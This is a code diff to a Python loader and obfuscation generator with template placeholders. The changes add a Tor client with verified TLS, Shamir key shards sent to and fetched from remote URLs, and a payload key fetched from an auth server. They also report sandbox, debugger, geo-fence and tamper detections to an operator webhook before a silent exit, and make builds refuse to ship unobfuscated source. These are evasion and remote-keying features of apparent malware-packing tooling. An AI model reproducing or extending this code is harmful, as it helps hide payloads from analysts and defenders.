@@ -338,16 +338,16 @@ class ExceptionFlowTransformer(ast.NodeTransformer):
         node.body = [init_assign, result_init, loop_init, while_loop]
         self.transform_count += 1
         return node
-def apply_ast_mutation(source_code, options=None):
+def apply_ast_mutation(source_code, options=None, strict=False):
     # Deep transforms (nested unparse, recursive flattening) need a raised
     # recursion limit, but importing this module must not raise it: on Windows
     # the 1 MB native stack turns a global high limit into an ACCESS_VIOLATION.
     # Scoped here so only the work pays for it.
     with deep_recursion():
-        return _apply_ast_mutation_inner(source_code, options)
+        return _apply_ast_mutation_inner(source_code, options, strict=strict)
 
 
-def _apply_ast_mutation_inner(source_code, options=None):
+def _apply_ast_mutation_inner(source_code, options=None, strict=False):
     if options is None: options = {}
     # Batch-2 MBA levels: validate early so an invalid mba_level raises
     # ValueError instead of being swallowed by the broad except below.
@@ -846,6 +846,13 @@ def _apply_ast_mutation_inner(source_code, options=None):
         # call sites and 8 production ones, but the failure is now WARNED, so a
         # caller that checks warnings or runs with -W error cannot miss it, and
         # a log reader sees it without scraping stdout.
+        if strict:
+            # Production builds must never ship the input unchanged because
+            # an internal transform blew up: that is every protection on
+            # this path silently missing (audit round 2).
+            raise SystemExit(
+                "apply_ast_mutation failed (%s: %s); refusing to emit "
+                "unobfuscated source" % (type(e).__name__, e))
         import warnings
         warnings.warn(
             "apply_ast_mutation failed and is returning the INPUT UNCHANGED: "
@@ -2851,9 +2858,9 @@ class {TOR_CLIENT_CLS}:
                 s.settimeout(15)
                 s.connect((host, port))
             if proto == "https":
+                # Verified TLS (audit round 2): disabled verification here let a
+                # MITM serve key/auth material.
                 ctx = ssl.create_default_context()
-                ctx.check_hostname = False
-                ctx.verify_mode = ssl.CERT_NONE
                 s = ctx.wrap_socket(s, server_hostname=host)
             if headers is None: headers = {{}}
             if "Host" not in headers: headers["Host"] = host
@@ -2879,35 +2886,59 @@ class {TOR_CLIENT_CLS}:
 '''
 KEY_SHARD_SOURCE = r'''
 class {KEY_SHARD_CLS}:
+    # Chunked Shamir over GF(2**127 - 1) in 15-byte chunks: a chunk must
+    # stay below the prime (16-byte chunks with the top bit set would not),
+    # and 3 chunks of <= 15 bytes cover every possible 32-byte key. One
+    # polynomial PER CHUNK drawn once (coefficients outside the x loop, or
+    # every share lands on a different polynomial and reconstruction is
+    # garbage).
     PRIME = 2**127 - 1
+    _CHUNK = 15
+    _KEY_LEN = 32
     def __init__(self, threshold=3, total_shards=5):
         self._threshold = threshold
         self._total = total_shards
         self._tor = {TOR_CLIENT_CLS}()
+    def _chunks(self, raw):
+        return [int.from_bytes(raw[o:o + self._CHUNK], 'big')
+                for o in range(0, self._KEY_LEN, self._CHUNK)]
+    def _chunk_sizes(self):
+        return [min(self._CHUNK, self._KEY_LEN - o)
+                for o in range(0, self._KEY_LEN, self._CHUNK)]
     def {METHOD_SPLIT_KEY}(self, key):
-        if isinstance(key, bytes): secret = int.from_bytes(key, 'big')
-        else: secret = int(key)
-        coefficients = [secret] + [_nixon_シークレット시크릿.randbelow(self.PRIME) for _ in range(self._threshold - 1)]
+        raw = key if isinstance(key, bytes) else int(key).to_bytes(self._KEY_LEN, 'big')
+        if len(raw) != self._KEY_LEN:
+            raise ValueError("key must be exactly %d bytes" % self._KEY_LEN)
+        chunk_polys = []
+        for secret in self._chunks(raw):
+            coefficients = [secret] + [_nixon_シークレットrandbelow(self.PRIME)
+                                       for _ in range(self._threshold - 1)]
+            chunk_polys.append(coefficients)
         shares = []
         for x in range(1, self._total + 1):
-            y = sum(c * pow(x, i, self.PRIME) for i, c in enumerate(coefficients)) % self.PRIME
-            shares.append((x, y))
+            ys = [sum(c * pow(x, i, self.PRIME) for i, c in enumerate(poly)) % self.PRIME
+                  for poly in chunk_polys]
+            shares.append((x, ys))
         return shares
     def {METHOD_RECONSTRUCT}(self, shares):
         if len(shares) < self._threshold: return None
         shares = shares[:self._threshold]
         x_coords = [s[0] for s in shares]
-        y_coords = [s[1] for s in shares]
-        result = 0
-        for i in range(len(shares)):
-            numerator, denominator = 1, 1
-            for j in range(len(shares)):
-                if i != j:
-                    numerator = (numerator * (0 - x_coords[j])) % self.PRIME
-                    denominator = (denominator * (x_coords[i] - x_coords[j])) % self.PRIME
-            lagrange = (numerator * pow(denominator, self.PRIME - 2, self.PRIME)) % self.PRIME
-            result = (result + y_coords[i] * lagrange) % self.PRIME
-        return result.to_bytes(32, 'big')
+        sizes = self._chunk_sizes()
+        def _lagrange(ys):
+            result = 0
+            for i in range(len(shares)):
+                numerator, denominator = 1, 1
+                for j in range(len(shares)):
+                    if i != j:
+                        numerator = (numerator * (0 - x_coords[j])) % self.PRIME
+                        denominator = (denominator * (x_coords[i] - x_coords[j])) % self.PRIME
+                lagrange = (numerator * pow(denominator, self.PRIME - 2, self.PRIME)) % self.PRIME
+                result = (result + ys[i] * lagrange) % self.PRIME
+            return result
+        parts = [_lagrange([s[1][ci] for s in shares]).to_bytes(sz, 'big')
+                 for ci, sz in enumerate(sizes)]
+        return b"".join(parts)
     def {METHOD_FETCH_SHARDS}(self, shard_urls):
         shards = []
         for url in shard_urls:
@@ -2915,10 +2946,10 @@ class {KEY_SHARD_CLS}:
                 resp = self._tor.request(url)
                 if not resp:
                     req = _nixon_ウラルユーアールエル유알엘.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
-                    with _nixon_ウラルユーアールエル유알엘.request.urlopen(req, timeout=5, encoding='utf-8') as r:
+                    with _nixon_ウラルユーアールエル유알엘.request.urlopen(req, timeout=5) as r:
                         resp = r.read()
                 data = _nixon_ジェイソン제이슨.loads(resp)
-                shards.append((int(data['x']), int(data['y'])))
+                shards.append((int(data['x']), [int(v) for v in data['ys']]))
             except: continue
         if len(shards) >= self._threshold:
             return self.{METHOD_RECONSTRUCT}(shards)
@@ -2928,9 +2959,9 @@ class {KEY_SHARD_CLS}:
         results = []
         for i, url in enumerate(shard_urls[:len(shares)]):
             try:
-                payload = _nixon_ジェイソン제이슨.dumps({'x': shares[i][0], 'y': str(shares[i][1])}).encode()
+                payload = _nixon_ジェイソン제이슨.dumps({{'x': shares[i][0], 'ys': [str(v) for v in shares[i][1]]}}).encode()
                 req = _nixon_ウラルユーアールエル유알엘.request.Request(url, data=payload,
-                    headers={'Content-Type': 'application/json'})
+                    headers={{'Content-Type': 'application/json'}})
                 res = _nixon_ウラルユーアールエル유알엘.request.urlopen(req, timeout=3)
                 results.append(True)
             except:
@@ -6361,6 +6392,16 @@ def _nx_strict_fail(reason):
     """
     if not globals().get("_NX_STRICT_DETECTIONS"):
         return
+    # Server-side detection (audit round 2): report BEFORE the exit —
+    # best-effort, the relay has its own 3 s timeout, and the operator's
+    # webhook learns about every strict-detection kill (sandbox, debugger,
+    # geo-fence, tamper...).  These detections died silently before.
+    try:
+        _nx_alert = globals().get("{FUNC_TRIGGER_ALERT}")
+        if callable(_nx_alert):
+            _nx_alert("strict:" + str(reason))
+    except Exception:
+        pass
     try:
         import os as _nx_st_os
         _nx_st_os._exit(137)
@@ -6393,6 +6434,11 @@ def _nx_self_fail(reason):
                               + str(reason) + "\n").encode("utf-8", "replace")[:256])
         except Exception:
             pass
+        try:
+            _nx_alert = globals().get("{FUNC_TRIGGER_ALERT}")
+            if callable(_nx_alert):
+                _nx_alert("kill:self-integrity")
+        except Exception: pass
         _nx_osf._exit(137)
     except Exception:
         try:
@@ -6626,10 +6672,9 @@ def {FUNC_NET}():
         try:
             raw_url = {FUNC_STR_DEC}({VAR_NET_URL})
             if not raw_url or len(raw_url) < 10: return b"\x00"*32
-            try:
-                doh_key = {FUNC_DOH}("key.nixon.auth") 
-                if doh_key: return doh_key.encode()[:32]
-            except: pass
+            # No DNS-TXT key shortcut: a hardcoded public domain's TXT
+            # record is fetchable by anyone, so those "key bytes" were a
+            # public constant (audit round 2).
             with {VAR_FUNC_SEC_MEM}(raw_url) as s_url:
                 url = s_url.decode()
                 hw = _nx_mac()
@@ -6638,14 +6683,21 @@ def {FUNC_NET}():
                 c = {FUNC_TLS_CTX}()
                 res = _nixon_ウラルユーアールエル유알엘.request.urlopen(r, timeout=5, context=c)
                 d = _nixon_ジェイソン제이슨.loads(res.read())
-                if d.get("valid"): return b"\x00"*32 
+                # Both branches used to return 32 zero bytes, so a valid
+                # server response produced the same key as a rejection.
+                if d.get("valid"):
+                    key_hex = d.get("key", "")
+                    try:
+                        key = bytes.fromhex(key_hex)
+                    except (TypeError, ValueError):
+                        key = b""
+                    if len(key) == 32:
+                        return key
                 return b"\x00"*32
         except Exception as e:
             if attempt == max_retries - 1:
                 {FUNC_LOG}("[FATAL] Network auth failed after retries") 
                 {FUNC_TRIGGER_ALERT}("Network Auth Failed Final")
-                if not {VAR_IS_DEBUG}:
-                    pass
             _nixon_時間時間.sleep(2 ** attempt)
     return b"\x00"*32
 def {FUNC_RES}():
@@ -6987,12 +7039,22 @@ def {FUNC_BOOT}():
             if not _nx_mac_h.compare_digest(_nx_mac_got,
                                           "{VAR_PAYLOAD_MAC}"):
                 {FUNC_LOG}("[FATAL] Payload integrity check failed")
+                try:
+                    _nx_alert = globals().get("{FUNC_TRIGGER_ALERT}")
+                    if callable(_nx_alert):
+                        _nx_alert("kill:payload-mac-mismatch")
+                except Exception: pass
                 import os as _nx_mac_os
                 _nx_mac_os._exit(137)
         except SystemExit:
             raise
         except Exception as _nx_mac_e:
             {FUNC_LOG}(f"[FATAL] Payload integrity check error: {{_nx_mac_e}}")
+            try:
+                _nx_alert = globals().get("{FUNC_TRIGGER_ALERT}")
+                if callable(_nx_alert):
+                    _nx_alert("kill:payload-mac-error")
+            except Exception: pass
             import os as _nx_mac_os2
             _nx_mac_os2._exit(137)
         ctx['h'] = {FUNC_NEXT_H}(ctx['h'], 8)
@@ -7104,7 +7166,13 @@ def {FUNC_BOOT}():
                 # (its own hash feeds the key derivation, so tampering
                 # corrupts the payload) simply ran nothing and exited 0.
                 # A tamperer saw a clean success.  Now a crashed loader
-                # dies like the kill ladder does: silent, exit 137.
+                # dies like the kill ladder does — and reports server-side
+                # first (audit round 2).
+                try:
+                    _nx_alert = globals().get("{FUNC_TRIGGER_ALERT}")
+                    if callable(_nx_alert):
+                        _nx_alert("kill:state-machine-crash")
+                except Exception: pass
                 import os as _nx_sm_os
                 _nx_sm_os._exit(137)
     # The payload must actually have run.  A tampered loader can
